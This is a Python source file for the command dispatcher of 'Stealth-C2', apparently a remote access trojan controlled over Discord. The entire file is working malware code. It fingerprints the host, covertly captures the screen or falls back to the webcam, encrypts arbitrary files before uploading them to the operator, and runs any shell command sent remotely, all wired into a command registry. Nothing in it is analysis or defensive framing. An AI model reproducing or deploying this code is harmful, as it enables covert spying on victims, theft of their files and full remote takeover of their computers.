"""
Stealth-C2 — Command Dispatcher
All handler functions + the EXEC_REGISTRY that maps command IDs to them.

Security note: cmd_exec uses shlex.split + shell=False to eliminate
shell-injection. Files exfiltrated by cmd_exfil are AES-256-GCM encrypted
before upload (nonce prepended, 12 bytes).
"""

from __future__ import annotations

import os
import sys
import platform
import subprocess
import shlex
from typing import Union

import discord
from mss import mss
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

import config
import key_manager


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _encrypt_file(filepath: str) -> str | None:
    """Encrypt file with AES-256-GCM, return path to .enc output or None."""
    try:
        nonce = os.urandom(12)
        with open(filepath, "rb") as fh:
            data = fh.read()
        ciphertext = AESGCM(config.AES_KEY).encrypt(nonce, data, None)
        enc_path   = os.path.join(config.TEMP_DIR, os.path.basename(filepath) + ".enc")
        with open(enc_path, "wb") as fh:
            fh.write(nonce + ciphertext)  # nonce || ciphertext format
        return enc_path
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

def get_system_info(args=None) -> str:
    return (
        f"🖥️  OS      : {platform.system()} {platform.release()}\n"
        f"👤  Hostname: {platform.node()}\n"
        f"🏗️  Arch    : {platform.machine()}\n"
        f"🐍  Python  : {platform.python_version()}"
    )


def try_everything_snapshot(args=None) -> Union[discord.File, str]:
    """Try screen capture first, fall back to webcam if blocked (e.g. Wayland)."""
    output_path = os.path.join(config.TEMP_DIR, "capture.png")
    if os.path.exists(output_path):
        os.remove(output_path)

    errors: list[str] = []

    # Attempt 1 — MSS screen capture
    try:
        with mss() as sct:
            sct.shot(mon=1, output=output_path)
        if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
            return discord.File(output_path, filename="screenshot.png")
    except Exception as e:
        errors.append(f"screen: {e}")

    # Attempt 2 — webcam via fswebcam
    try:
        subprocess.run(
            ["fswebcam", "-r", "1280x720", "--no-banner", "-S", "20", output_path],
            capture_output=True, text=True, timeout=10,
        )
        if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
            return discord.File(output_path, filename="webcam.png")
    except Exception as e:
        errors.append(f"webcam: {e}")

    return f"⚠️  All capture methods failed — {' | '.join(errors)}"


def exfiltrate_file(filepath=None) -> Union[discord.File, str]:
    if not filepath:
        return "⚠️  Usage: 📂 /path/to/file"
    if not os.path.exists(filepath):
        return f"⚠️  File not found: {filepath}"
    enc_path = _encrypt_file(filepath)
    return discord.File(enc_path) if enc_path else "⚠️  Encryption failed."


def ping_pong(args=None) -> str:
    return "🏓  Pong! Agent is alive."


def rotate_encryption_key(args=None) -> str:
    """Rotate AES key and hot-swap it in the running process."""
    try:
        new_key        = key_manager.rotate_key()
        config.AES_KEY = new_key  # No restart needed
        backups        = key_manager.list_backups()
        return (
            f"🔑  Key rotated. {len(backups)} backup(s) in ~/.stealth_c2/\n"
            f"    Decrypt old files: python decrypt_tool.py --key-file <backup>.bin.bak"
        )
    except Exception as e:
        return f"⚠️  Key rotation failed: {e}"


def run_terminal_command(command_str=None) -> str:
    if not command_str:
        return "⚠️  Usage: ⚡ <command>"
    try:
        args   = shlex.split(command_str, posix=(platform.system() != "Windows"))
        result = subprocess.run(
            args, shell=False, capture_output=True, text=True, timeout=15
        )
        output = (result.stdout + result.stderr).strip()
        if not output:
            return "✅  Command executed (no output)."
        if len(output) > 1_900:
            return f"⚠️  Output truncated ({len(output)} chars):\n{output[:1900]}\n[…]"
        return output
    except FileNotFoundError:
        return f"⚠️  Command not found: '{command_str.split()[0]}'"
    except subprocess.TimeoutExpired:
        return "⚠️  Command timed out (15s)."
    except Exception as e:
        return f"⚠️  Error: {e}"


def remote_exit(args=None) -> None:
    sys.exit(0)


# ---------------------------------------------------------------------------
# Registry — dispatched by main.py
# ---------------------------------------------------------------------------

EXEC_REGISTRY: dict = {
    "cmd_shell":      get_system_info,
    "cmd_screenshot": try_everything_snapshot,
    "cmd_ping":       ping_pong,
    "cmd_exfil":      exfiltrate_file,
    "cmd_exit":       remote_exit,
    "cmd_exec":       run_terminal_command,
    "cmd_keygen":     rotate_encryption_key,
}